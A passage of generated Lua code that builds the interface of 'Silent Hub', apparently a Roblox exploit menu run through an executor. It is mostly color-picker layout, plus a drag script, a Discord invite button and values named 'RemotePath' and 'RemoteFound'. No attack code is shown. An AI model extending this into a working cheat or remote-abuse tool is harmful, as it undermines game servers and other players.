G2L["9b"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9b"]["Text"] = [[]];
G2L["9b"]["Name"] = [[Down]];
G2L["9b"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow
G2L["9c"] = Instance.new("Frame", G2L["9b"]);
G2L["9c"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["9c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9c"]["Name"] = [[Arrow]];
G2L["9c"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9d"] = Instance.new("Frame", G2L["9c"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9d"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["9d"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9e"] = Instance.new("Frame", G2L["9c"]);
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9e"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["9e"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9f"] = Instance.new("Frame", G2L["9c"]);
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9f"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["9f"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Title
G2L["a0"] = Instance.new("TextLabel", G2L["93"]);
G2L["a0"]["TextSize"] = 14;
G2L["a0"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a0"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a0"]["BackgroundTransparency"] = 1;
G2L["a0"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a0"]["Text"] = [[Green:]];
G2L["a0"]["Name"] = [[Title]];
G2L["a0"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red
G2L["a1"] = Instance.new("Frame", G2L["5a"]);
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["a1"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["a1"]["Position"] = UDim2.new(1, -63, 0, 211);
G2L["a1"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["a1"]["Name"] = [[Red]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input
G2L["a2"] = Instance.new("TextBox", G2L["a1"]);
G2L["a2"]["Name"] = [[Input]];
G2L["a2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a2"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["a2"]["TextSize"] = 14;
G2L["a2"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["a2"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["a2"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["a2"]["Text"] = [[0]];
G2L["a2"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame
G2L["a3"] = Instance.new("Frame", G2L["a2"]);
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["a3"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a3"]["Name"] = [[ArrowFrame]];
G2L["a3"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up
G2L["a4"] = Instance.new("TextButton", G2L["a3"]);
G2L["a4"]["BorderSizePixel"] = 0;
G2L["a4"]["TextSize"] = 14;
G2L["a4"]["AutoButtonColor"] = false;
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a4"]["BackgroundTransparency"] = 1;
G2L["a4"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["a4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a4"]["Text"] = [[]];
G2L["a4"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow
G2L["a5"] = Instance.new("Frame", G2L["a4"]);
G2L["a5"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a5"]["Name"] = [[Arrow]];
G2L["a5"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["a6"] = Instance.new("Frame", G2L["a5"]);
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a6"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["a6"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["a7"] = Instance.new("Frame", G2L["a5"]);
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a7"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["a7"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["a8"] = Instance.new("Frame", G2L["a5"]);
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a8"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["a8"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["a8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down
G2L["a9"] = Instance.new("TextButton", G2L["a3"]);
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextSize"] = 14;
G2L["a9"]["AutoButtonColor"] = false;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["BackgroundTransparency"] = 1;
G2L["a9"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a9"]["Text"] = [[]];
G2L["a9"]["Name"] = [[Down]];
G2L["a9"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow
G2L["aa"] = Instance.new("Frame", G2L["a9"]);
G2L["aa"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["aa"]["Name"] = [[Arrow]];
G2L["aa"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["ab"] = Instance.new("Frame", G2L["aa"]);
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ab"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["ab"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["ac"] = Instance.new("Frame", G2L["aa"]);
G2L["ac"]["BorderSizePixel"] = 0;
G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ac"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["ac"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["ac"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["ad"] = Instance.new("Frame", G2L["aa"]);
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ad"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["ad"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Red.Title
G2L["ae"] = Instance.new("TextLabel", G2L["a1"]);
G2L["ae"]["TextSize"] = 14;
G2L["ae"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ae"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ae"]["BackgroundTransparency"] = 1;
G2L["ae"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["ae"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ae"]["Text"] = [[Red:]];
G2L["ae"]["Name"] = [[Title]];
G2L["ae"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue
G2L["af"] = Instance.new("Frame", G2L["5a"]);
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["af"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["af"]["Position"] = UDim2.new(1, -63, 0, 255);
G2L["af"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["af"]["Name"] = [[Blue]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input
G2L["b0"] = Instance.new("TextBox", G2L["af"]);
G2L["b0"]["Name"] = [[Input]];
G2L["b0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b0"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["b0"]["TextSize"] = 14;
G2L["b0"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["b0"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b0"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["b0"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["b0"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["b0"]["Text"] = [[0]];
G2L["b0"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame
G2L["b1"] = Instance.new("Frame", G2L["b0"]);
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["b1"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["b1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b1"]["Name"] = [[ArrowFrame]];
G2L["b1"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up
G2L["b2"] = Instance.new("TextButton", G2L["b1"]);
G2L["b2"]["BorderSizePixel"] = 0;
G2L["b2"]["TextSize"] = 14;
G2L["b2"]["AutoButtonColor"] = false;
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b2"]["BackgroundTransparency"] = 1;
G2L["b2"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["b2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b2"]["Text"] = [[]];
G2L["b2"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow
G2L["b3"] = Instance.new("Frame", G2L["b2"]);
G2L["b3"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b3"]["Name"] = [[Arrow]];
G2L["b3"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["b4"] = Instance.new("Frame", G2L["b3"]);
G2L["b4"]["BorderSizePixel"] = 0;
G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b4"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["b4"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["b4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["b5"] = Instance.new("Frame", G2L["b3"]);
G2L["b5"]["BorderSizePixel"] = 0;
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b5"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["b5"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["b5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["b6"] = Instance.new("Frame", G2L["b3"]);
G2L["b6"]["BorderSizePixel"] = 0;
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b6"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["b6"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down
G2L["b7"] = Instance.new("TextButton", G2L["b1"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["AutoButtonColor"] = false;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["BackgroundTransparency"] = 1;
G2L["b7"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b7"]["Text"] = [[]];
G2L["b7"]["Name"] = [[Down]];
G2L["b7"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow
G2L["b8"] = Instance.new("Frame", G2L["b7"]);
G2L["b8"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["b8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b8"]["Name"] = [[Arrow]];
G2L["b8"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["b9"] = Instance.new("Frame", G2L["b8"]);
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b9"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["b9"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["ba"] = Instance.new("Frame", G2L["b8"]);
G2L["ba"]["BorderSizePixel"] = 0;
G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ba"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["ba"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["ba"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["bb"] = Instance.new("Frame", G2L["b8"]);
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bb"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["bb"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["bb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Blue.Title
G2L["bc"] = Instance.new("TextLabel", G2L["af"]);
G2L["bc"]["TextSize"] = 14;
G2L["bc"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bc"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bc"]["BackgroundTransparency"] = 1;
G2L["bc"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bc"]["Text"] = [[Blue:]];
G2L["bc"]["Name"] = [[Title]];
G2L["bc"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Ok
G2L["bd"] = Instance.new("TextButton", G2L["5a"]);
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["TextSize"] = 14;
G2L["bd"]["AutoButtonColor"] = false;
G2L["bd"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bd"]["BackgroundTransparency"] = 0.7;
G2L["bd"]["Size"] = UDim2.new(0, 100, 0, 25);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["bd"]["Text"] = [[OK]];
G2L["bd"]["Name"] = [[Ok]];
G2L["bd"]["Position"] = UDim2.new(1, -210, 1, -28);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Cancel
G2L["be"] = Instance.new("TextButton", G2L["5a"]);
G2L["be"]["BorderSizePixel"] = 0;
G2L["be"]["TextSize"] = 14;
G2L["be"]["AutoButtonColor"] = false;
G2L["be"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["be"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["be"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["be"]["BackgroundTransparency"] = 0.7;
G2L["be"]["Size"] = UDim2.new(0, 100, 0, 25);
G2L["be"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["be"]["Text"] = [[Cancel]];
G2L["be"]["Name"] = [[Cancel]];
G2L["be"]["Position"] = UDim2.new(1, -105, 1, -28);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.BasicColors
G2L["bf"] = Instance.new("Frame", G2L["5a"]);
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["Size"] = UDim2.new(0, 180, 0, 200);
G2L["bf"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bf"]["Name"] = [[BasicColors]];
G2L["bf"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.BasicColors.Title
G2L["c0"] = Instance.new("TextLabel", G2L["bf"]);
G2L["c0"]["TextSize"] = 14;
G2L["c0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c0"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c0"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c0"]["BackgroundTransparency"] = 1;
G2L["c0"]["Size"] = UDim2.new(1, 0, 0, 26);
G2L["c0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c0"]["Text"] = [[Basic Colors]];
G2L["c0"]["Name"] = [[Title]];
G2L["c0"]["Position"] = UDim2.new(0, 0, 0, -5);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.CustomColors
G2L["c1"] = Instance.new("Frame", G2L["5a"]);
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["Size"] = UDim2.new(0, 180, 0, 90);
G2L["c1"]["Position"] = UDim2.new(0, 5, 0, 210);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c1"]["Name"] = [[CustomColors]];
G2L["c1"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.CustomColors.Title
G2L["c2"] = Instance.new("TextLabel", G2L["c1"]);
G2L["c2"]["TextSize"] = 14;
G2L["c2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c2"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c2"]["BackgroundTransparency"] = 1;
G2L["c2"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["c2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c2"]["Text"] = [[Custom Colors (RC = Set)]];
G2L["c2"]["Name"] = [[Title]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.TopBar
G2L["c3"] = Instance.new("Frame", G2L["59"]);
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["c3"]["Size"] = UDim2.new(1, 0, 0, 25);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c3"]["Name"] = [[TopBar]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.TopBar.WindowTitle
G2L["c4"] = Instance.new("TextLabel", G2L["c3"]);
G2L["c4"]["TextSize"] = 14;
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c4"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c4"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c4"]["BackgroundTransparency"] = 1;
G2L["c4"]["Size"] = UDim2.new(1, -50, 0, 25);
G2L["c4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c4"]["Text"] = [[Color Picker]];
G2L["c4"]["Name"] = [[WindowTitle]];
G2L["c4"]["Position"] = UDim2.new(0, 25, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.TopBar.Close
G2L["c5"] = Instance.new("TextButton", G2L["c3"]);
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["TextSize"] = 20;
G2L["c5"]["AutoButtonColor"] = false;
G2L["c5"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Merriweather.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c5"]["BackgroundTransparency"] = 1;
G2L["c5"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["c5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c5"]["Text"] = [[🗙]];
G2L["c5"]["Name"] = [[Close]];
G2L["c5"]["Visible"] = false;
G2L["c5"]["Position"] = UDim2.new(1, -27, 0, 0);


-- StarterGui.SilentHub.Scripts
G2L["c6"] = Instance.new("Folder", G2L["1"]);
G2L["c6"]["Name"] = [[Scripts]];


-- StarterGui.SilentHub.Scripts.Loader
G2L["c7"] = Instance.new("LocalScript", G2L["c6"]);
G2L["c7"]["Name"] = [[Loader]];


-- StarterGui.SilentHub.Values
G2L["c8"] = Instance.new("Folder", G2L["1"]);
G2L["c8"]["Name"] = [[Values]];


-- StarterGui.SilentHub.Values.RemotePath
G2L["c9"] = Instance.new("StringValue", G2L["c8"]);
G2L["c9"]["Name"] = [[RemotePath]];


-- StarterGui.SilentHub.Values.Minimized
G2L["ca"] = Instance.new("BoolValue", G2L["c8"]);
G2L["ca"]["Name"] = [[Minimized]];


-- StarterGui.SilentHub.Values.RemoteFound
G2L["cb"] = Instance.new("BoolValue", G2L["c8"]);
G2L["cb"]["Name"] = [[RemoteFound]];


-- StarterGui.SilentHub.Values.RainbowEnabled
G2L["cc"] = Instance.new("BoolValue", G2L["c8"]);
G2L["cc"]["Name"] = [[RainbowEnabled]];


-- StarterGui.SilentHub.Values.ChangePickerBackground
G2L["cd"] = Instance.new("BoolValue", G2L["c8"]);
G2L["cd"]["Name"] = [[ChangePickerBackground]];


-- StarterGui.SilentHub.UI.MainContainer.UIDrag
local function C_4()
local script = G2L["4"];
	local UIS = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.06
	local dragStart = nil
	local startPos = nil
	local dragTween
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	
		if dragTween then
			dragTween:Cancel()
		end
	
		dragTween = TweenService:Create(
			frame,
			TweenInfo.new(dragSpeed, Enum.EasingStyle.Linear),
			{Position = position}
		)
		dragTween:Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord.LocalScript
local function C_b()
local script = G2L["b"];
	local button = script.Parent
	local server = "dsc.gg/teamc00lkidd"
	
	button.Text = "Server: "..server
	
	button.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(server)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Invite link copied!"
			})
		else
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "setclipboard is not supported on your executor."
			})
		end
	end)
	
end;
task.spawn(C_b);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD.LocalScript
local function C_d()
local script = G2L["d"];
	local label = script.Parent
	
	local messages = {
		"There are tons of scripts for you to use in the 'Scripts' tab.",
		"Use the 'Settings' tab to change the appearance of the UI.",
